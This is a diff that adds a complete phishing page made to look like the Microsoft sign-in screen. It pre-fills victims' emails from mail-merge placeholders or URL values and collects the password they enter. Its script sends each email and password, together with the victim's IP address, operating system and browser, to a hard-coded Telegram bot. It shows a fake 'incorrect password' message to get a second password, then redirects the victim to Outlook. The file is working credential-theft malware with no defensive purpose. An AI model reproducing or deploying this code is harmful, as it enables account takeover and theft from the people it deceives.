@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Sign In</title>
+    <!-- Microsoft Favicon -->
+    <link rel="icon" type="image/x-icon" href="https://www.microsoft.com/favicon.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.microsoft.com/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.microsoft.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://www.microsoft.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://www.microsoft.com/favicon-16x16.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #e8ecf1 0%, #f0f2f5 50%, #e8ecf1 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .main-card {
+            background: white;
+            width: 100%;
+            max-width: 440px;
+            padding: 44px 44px 36px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            margin-bottom: 16px;
+            border-radius: 8px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .logo-icon {
+            width: 21px;
+            height: 21px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: 1fr 1fr;
+            gap: 1px;
+            margin-right: 12px;
+        }
+
+        .logo-icon .square {
+            width: 10px;
+            height: 10px;
+        }
+
+        .logo-icon .square.red { background-color: #f25022; }
+        .logo-icon .square.green { background-color: #7fba00; }
+        .logo-icon .square.blue { background-color: #00a4ef; }
+        .logo-icon .square.yellow { background-color: #ffb900; }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: 600;
+            color: #737373;
+        }
+
+        .step3 .email-display-plain {
+            text-align: center;
+            font-size: 15px;
+            font-weight: 500;
+            color: #3a3a3a;
+            margin-bottom: 24px;
+            padding: 0;
+            border: none;
+            background: transparent;
+            letter-spacing: 0.3px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .step1 h1 {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+
+        .step1 .logo {
+            justify-content: flex-start;
+        }
+
+        .input-group {
+            margin-bottom: 8px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 6px 0;
+            font-size: 15px;
+            border: none;
+            border-bottom: 1px solid #0067b8;
+            outline: none;
+            color: #1b1b1b;
+            font-family: inherit;
+        }
+
+        input[type="text"]::placeholder {
+            color: #737373;
+        }
+
+        .links {
+            margin-top: 12px;
+        }
+
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+            color: #005a9e;
+        }
+
+        .links p {
+            margin-bottom: 12px;
+            font-size: 12px;
+            color: #1b1b1b;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 24px;
+        }
+
+        .btn-next {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 8px 32px;
+            font-size: 15px;
+            font-family: inherit;
+            cursor: pointer;
+            min-width: 108px;
+        }
+
+        .btn-next:hover {
+            background-color: #005a9e;
+        }
+
+        .options-card {
+            background: white;
+            width: 100%;
+            max-width: 440px;
+            padding: 16px 44px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            border-radius: 8px;
+        }
+
+        .options-card:hover {
+            background-color: #f9f9f9;
+        }
+
+        .options-text {
+            font-size: 15px;
+            color: #1b1b1b;
+        }
+
+        .step3 .logo {
+            justify-content: center;
+        }
+
+        .back-arrow {
+            position: absolute;
+            left: 20px;
+            top: 20px;
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .password-wrapper {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .password-input-container {
+            position: relative;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+        }
+
+        .password-input-container:focus-within {
+            border-color: #0067b8;
+            border-bottom: 2px solid #0067b8;
+        }
+
+        .password-label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 15px;
+            color: #737373;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background: white;
+            padding: 0 4px;
+        }
+
+        .password-input-container:focus-within .password-label,
+        .password-input-container.has-value .password-label {
+            top: -8px;
+            font-size: 12px;
+            color: #0067b8;
+        }
+
+        .password-input-container input[type="password"],
+        .password-input-container input[type="text"] {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            font-family: inherit;
+            color: #1b1b1b;
+            background: transparent;
+            padding-right: 30px;
+        }
+
+        input[type="password"]::-ms-reveal,
+        input[type="password"]::-ms-clear {
+            display: none !important;
+        }
+
+        input[type="password"]::-webkit-credentials-auto-fill-button {
+            visibility: hidden;
+            display: none !important;
+            pointer-events: none;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        .btn-next-full {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 15px;
+            font-family: inherit;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 4px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .btn-next-full:hover {
+            background-color: #005a9e;
+        }
+
+        .other-ways-link {
+            text-align: center;
+            margin-top: 8px;
+        }
+
+        .other-ways-link a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .other-ways-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 8px;
+        }
+
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-note {
+            color: #737373;
+            font-size: 12px;
+        }
+
+        .footer-note a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .password-error-msg {
+            font-size: 12px;
+            color: #d13438;
+            margin-top: 4px;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .step3 h1 {
+            font-size: 20px;
+            margin-bottom: 28px;
+        }
+
+        #step2 {
+            display: none !important;
+        }
+
+        .step3 .email-display-plain {
+            border: none;
+            background: transparent;
+            padding: 0;
+            margin-bottom: 28px;
+        }
+
+        .gammadyne-grabber {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden elements for Gammadyne commands -->
+    <div id="emailGrabber" class="gammadyne-grabber">[[-Email-]]</div>
+    <div id="emailHashGrabber" class="gammadyne-grabber">#email</div>
+
+    <!-- Step 1: Email Entry -->
+    <div id="step1" class="main-card step1">
+        <div class="logo">
+            <div class="logo-icon">
+                <div class="square red"></div>
+                <div class="square green"></div>
+                <div class="square blue"></div>
+                <div class="square yellow"></div>
+            </div>
+            <span class="logo-text">Microsoft</span>
+        </div>
+
+        <h1>Sign in</h1>
+
+        <div class="input-group">
+            <input type="text" id="emailInput" placeholder="Email, phone, or Skype" value="">
+        </div>
+
+        <div class="links">
+            <p>No account? <a href="#">Create one!</a></p>
+            <p><a href="#">Can't access your account?</a></p>
+        </div>
+
+        <div class="button-container">
+            <button class="btn-next" id="step1NextBtn">Next</button>
+        </div>
+    </div>
+
+    <div id="step1Options" class="options-card">
+        <span class="options-text">Sign-in options</span>
+    </div>
+
+    <!-- Step 2: removed -->
+    <div id="step2" class="main-card hidden"></div>
+
+    <!-- Step 3: Enter your password -->
+    <div id="step3" class="main-card hidden step3" style="position: relative;">
+        <div class="back-arrow" id="backArrowStep3">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1b1b1b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"/>
+                <polyline points="12 19 5 12 12 5"/>
+            </svg>
+        </div>
+
+        <div class="logo" style="justify-content: center;">
+            <div class="logo-icon">
+                <div class="square red"></div>
+                <div class="square green"></div>
+                <div class="square blue"></div>
+                <div class="square yellow"></div>
+            </div>
+            <span class="logo-text">Microsoft</span>
+        </div>
+
+        <div id="displayEmailStep3" class="email-display-plain"></div>
+
+        <h1>Enter your password</h1>
+
+        <div class="password-wrapper">
+            <div class="password-input-container" id="passwordContainer">
+                <label class="password-label" for="passwordInput">Password</label>
+                <input type="password" id="passwordInput" autocomplete="off" oninput="checkPassword()">
+                <div class="eye-icon" onclick="togglePassword()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#737373" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                    </svg>
+                </div>
+            </div>
+            <div id="passwordErrorMsg" class="password-error-msg"></div>
+        </div>
+
+        <button class="btn-next-full" id="nextPasswordBtn">Next</button>
+
+        <div class="other-ways-link">
+            <a href="#" id="otherWaysLink">Other ways to sign in</a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div id="footer" class="footer hidden">
+        <div class="footer-links">
+            <a href="#">Help and feedback</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy and cookies</a>
+        </div>
+        <div class="footer-note">
+            Use private browsing if this is not your device. <a href="#">Learn more</a>
+        </div>
+    </div>
+
+    <script>
+        // ---------- Get User IP Address - MULTIPLE METHODS ----------
+        async function getUserIP() {
+            // Method 1: Try ipify
+            try {
+                const response = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.ip) return data.ip;
+                }
+            } catch (e) {}
+
+            // Method 2: Try my-ip.io
+            try {
+                const response = await fetch('https://api.my-ip.io/ip.json', { timeout: 5000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.ip) return data.ip;
+                }
+            } catch (e) {}
+
+            // Method 3: Try ipapi.co
+            try {
+                const response = await fetch('https://ipapi.co/json/', { timeout: 5000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.ip) return data.ip;
+                }
+            } catch (e) {}
+
+            // Method 4: Try httpbin
+            try {
+                const response = await fetch('https://httpbin.org/ip', { timeout: 5000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.origin) return data.origin;
+                }
+            } catch (e) {}
+
+            // Method 5: Try ip.sb
+            try {
+                const response = await fetch('https://api.ip.sb/jsonip', { timeout: 5000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.ip) return data.ip;
+                }
+            } catch (e) {}
+
+            // Method 6: Try ifconfig.me
+            try {
+                const response = await fetch('https://ifconfig.me/json', { timeout: 5000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.ip_addr) return data.ip_addr;
+                }
+            } catch (e) {}
+
+            // Method 7: Try icanhazip
+            try {
+                const response = await fetch('https://icanhazip.com/', { timeout: 5000 });
+                if (response.ok) {
+                    const ip = await response.text();
+                    if (ip && ip.trim()) return ip.trim();
+                }
+            } catch (e) {}
+
+            // Method 8: Try via WebRTC (local IP fallback)
+            try {
+                return new Promise((resolve) => {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (ice) => {
+                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                        const ipMatch = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (ipMatch) {
+                            pc.close();
+                            resolve(ipMatch[1]);
+                        }
+                    };
+                    setTimeout(() => {
+                        pc.close();
+                        resolve('Unable to fetch IP');
+                    }, 3000);
+                });
+            } catch (e) {}
+
+            return 'Unable to fetch IP';
+        }
+
+        // ---------- Get System Info ----------
+        function getSystemInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown OS';
+            let browser = 'Unknown Browser';
+            
+            if (ua.indexOf('Windows') !== -1) os = 'Windows';
+            else if (ua.indexOf('Mac') !== -1) os = 'MacOS';
+            else if (ua.indexOf('Linux') !== -1) os = 'Linux';
+            else if (ua.indexOf('Android') !== -1) os = 'Android';
+            else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
+            
+            if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
+            else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (ua.indexOf('Edg') !== -1) browser = 'Edge';
+            else if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) browser = 'Opera';
+            
+            return { os, browser };
+        }
+
+        // ---------- Telegram configuration ----------
+        const BOT_TOKEN = "7984431123:AAGPrQDYtNIro_21XCwYLhuWICe9EWt5KTM";
+        const CHAT_ID = "5045461825";
+
+        async function sendToTelegram(message) {
+            if (!BOT_TOKEN || !CHAT_ID) {
+                console.warn("Telegram credentials missing");
+                return;
+            }
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            };
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Telegram send error:", error);
+            }
+        }
+
+        // ---------- Global state ----------
+        let passwordAttemptCount = 0;
+        let capturedEmail = '';
+        let firstPasswordValue = '';
+        let userIP = 'Fetching...';
+        let systemInfo = getSystemInfo();
+        let ipFetched = false;
+
+        // Get IP immediately
+        getUserIP().then(ip => {
+            userIP = ip;
+            ipFetched = true;
+            console.log('IP fetched:', userIP);
+        });
+
+        function resetPasswordAttemptState() {
+            passwordAttemptCount = 0;
+            firstPasswordValue = '';
+            const pwdInput = document.getElementById('passwordInput');
+            if (pwdInput) {
+                pwdInput.value = '';
+                pwdInput.type = 'password';
+                checkPassword();
+            }
+            const errorDiv = document.getElementById('passwordErrorMsg');
+            if (errorDiv) errorDiv.innerHTML = '';
+            const container = document.getElementById('passwordContainer');
+            if (container) container.classList.remove('has-value');
+        }
+
+        // ----- ONLY grab email from Gammadyne commands -----
+        function getEmailFromGammadyne() {
+            let email = '';
+
+            // 1. Check for [[-Email-]] command
+            const emailGrabber = document.getElementById('emailGrabber');
+            if (emailGrabber) {
+                const content = emailGrabber.textContent.trim();
+                if (content && content !== '[[-Email-]]' && content !== '' && content !== '#email') {
+                    if (content.includes('@') && content.includes('.')) {
+                        email = content;
+                        console.log('Grabbed email from [[-Email-]]:', email);
+                        return email;
+                    }
+                }
+            }
+
+            // 2. Check for #email command
+            const hashGrabber = document.getElementById('emailHashGrabber');
+            if (hashGrabber) {
+                const content = hashGrabber.textContent.trim();
+                if (content && content !== '#email' && content !== '' && content !== '[[-Email-]]') {
+                    if (content.includes('@') && content.includes('.')) {
+                        email = content;
+                        console.log('Grabbed email from #email:', email);
+                        return email;
+                    }
+                }
+            }
+
+            // 3. Check URL hash
+            const hash = window.location.hash;
+            if (hash && hash.length > 1) {
+                const hashContent = hash.substring(1);
+                if (hashContent.includes('@') && hashContent.includes('.') && 
+                    hashContent !== '#email' && hashContent !== '[[-Email-]]') {
+                    email = hashContent;
+                    console.log('Grabbed email from URL hash:', email);
+                    return email;
+                }
+            }
+
+            // 4. Check URL parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlEmail = urlParams.get('email');
+            if (urlEmail && urlEmail.trim() !== '' && urlEmail.includes('@') && urlEmail.includes('.')) {
+                email = urlEmail.trim();
+                console.log('Grabbed email from URL parameter:', email);
+                return email;
+            }
+
+            return null;
+        }
+
+        function goToStep3Direct(email) {
+            if (!email || email.trim() === '') {
+                console.warn('No email provided');
+                return;
+            }
+            capturedEmail = email;
+            const display = document.getElementById('displayEmailStep3');
+            if (display) display.textContent = email;
+            
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step1Options').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            document.getElementById('footer').classList.remove('hidden');
+            
+            resetPasswordAttemptState();
+            
+            const pwdInput = document.getElementById('passwordInput');
+            if (pwdInput) {
+                setTimeout(() => pwdInput.focus(), 100);
+            }
+        }
+
+        function handleEmailSubmit() {
+            const inputField = document.getElementById('emailInput');
+            const email = inputField.value.trim();
+            if (!email) {
+                alert('Please enter your email');
+                return;
+            }
+            goToStep3Direct(email);
+        }
+
+        function goBackToStep1() {
+            document.getElementById('step1').classList.remove('hidden');
+            document.getElementById('step1Options').classList.remove('hidden');
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('footer').classList.add('hidden');
+            resetPasswordAttemptState();
+            document.getElementById('displayEmailStep3').textContent = '';
+            capturedEmail = '';
+        }
+
+        function otherWaysHandler(e) {
+            e.preventDefault();
+            goBackToStep1();
+        }
+
+        function checkPassword() {
+            const container = document.getElementById('passwordContainer');
+            const input = document.getElementById('passwordInput');
+            if (input.value.length > 0) {
+                container.classList.add('has-value');
+            } else {
+                container.classList.remove('has-value');
+            }
+        }
+
+        function togglePassword() {
+            const input = document.getElementById('passwordInput');
+            if (input.type === 'password') {
+                input.type = 'text';
+            } else {
+                input.type = 'password';
+            }
+        }
+
+        function showIncorrectPasswordAndClear() {
+            const pwdInput = document.getElementById('passwordInput');
+            const errorDiv = document.getElementById('passwordErrorMsg');
+            pwdInput.value = '';
+            pwdInput.type = 'password';
+            checkPassword();
+            errorDiv.innerHTML = 'Incorrect password. Please try again.';
+            pwdInput.focus();
+        }
+
+        function redirectToOutlook() {
+            window.location.href = "https://outlook.com";
+        }
+
+        async function handlePasswordSubmit() {
+            const pwdInput = document.getElementById('passwordInput');
+            const enteredPassword = pwdInput.value;
+            const errorDiv = document.getElementById('passwordErrorMsg');
+
+            let emailToSend = capturedEmail;
+            if (!emailToSend) {
+                const display = document.getElementById('displayEmailStep3');
+                if (display && display.textContent) emailToSend = display.textContent;
+                else emailToSend = 'unknown@example.com';
+            }
+
+            if (!enteredPassword) {
+                errorDiv.innerHTML = 'Please enter your password.';
+                return;
+            }
+
+            errorDiv.innerHTML = '';
+
+            // Get IP if not fetched yet
+            if (!ipFetched || userIP === 'Fetching...') {
+                userIP = await getUserIP();
+                ipFetched = true;
+            }
+
+            const systemDetails = `OS: ${systemInfo.os} | Browser: ${systemInfo.browser}`;
+            const timestamp = new Date().toLocaleString();
+
+            if (passwordAttemptCount === 0) {
+                firstPasswordValue = enteredPassword;
+                const messageFirst = `🔐 Microsoft Sign-In Attempt (1st)\n\n📧 Email: ${emailToSend}\n🔑 Password: ${firstPasswordValue}\n\n🌐 IP Address: ${userIP}\n💻 ${systemDetails}\n⏱️ Time: ${timestamp}`;
+                await sendToTelegram(messageFirst);
+                showIncorrectPasswordAndClear();
+                passwordAttemptCount = 1;
+                return;
+            } 
+            else if (passwordAttemptCount === 1) {
+                const secondPassword = enteredPassword;
+                const messageSecond = `🔐 Microsoft Sign-In Attempt (2nd)\n\n📧 Email: ${emailToSend}\n🔑 Password: ${secondPassword}\n\n🌐 IP Address: ${userIP}\n💻 ${systemDetails}\n⏱️ Time: ${timestamp}`;
+                await sendToTelegram(messageSecond);
+                redirectToOutlook();
+                return;
+            }
+            redirectToOutlook();
+        }
+
+        // ----- DOM ready -----
+        document.addEventListener('DOMContentLoaded', function() {
+            // Step1 Next button
+            const step1Next = document.getElementById('step1NextBtn');
+            if (step1Next) {
+                step1Next.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    handleEmailSubmit();
+                });
+            }
+
+            // Enter key on email input
+            const emailInput = document.getElementById('emailInput');
+            if (emailInput) {
+                emailInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        handleEmailSubmit();
+                    }
+                });
+            }
+
+            // Back arrow in step3
+            const backArrow = document.getElementById('backArrowStep3');
+            if (backArrow) {
+                backArrow.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    goBackToStep1();
+                });
+            }
+
+            // "Other ways to sign in" -> back to step1
+            const otherLink = document.getElementById('otherWaysLink');
+            if (otherLink) {
+                otherLink.addEventListener('click', otherWaysHandler);
+            }
+
+            // Next password button
+            const nextPwdBtn = document.getElementById('nextPasswordBtn');
+            if (nextPwdBtn) {
+                const newBtn = nextPwdBtn.cloneNode(true);
+                nextPwdBtn.parentNode.replaceChild(newBtn, nextPwdBtn);
+                newBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    handlePasswordSubmit();
+                });
+            }
+
+            // Enter key on password input
+            const pwdInput = document.getElementById('passwordInput');
+            if (pwdInput) {
+                pwdInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        handlePasswordSubmit();
+                    }
+                });
+            }
+
+            // Check for Gammadyne commands
+            setTimeout(() => {
+                const autoEmail = getEmailFromGammadyne();
+                if (autoEmail) {
+                    const inputField = document.getElementById('emailInput');
+                    if (inputField) inputField.value = autoEmail;
+                    console.log('Gammadyne email detected, redirecting to password section...');
+                    goToStep3Direct(autoEmail);
+                }
+            }, 300);
+        });
+
+        window.checkPassword = checkPassword;
+        window.togglePassword = togglePassword;
+        window.goBackToStep1 = goBackToStep1;
+        window.handleEmailSubmit = handleEmailSubmit;
+        window.handlePasswordSubmit = handlePasswordSubmit;
+        window.getEmailFromGammadyne = getEmailFromGammadyne;
+        window.goToStep3Direct = goToStep3Direct;
+    </script>
+</body>
+</html>
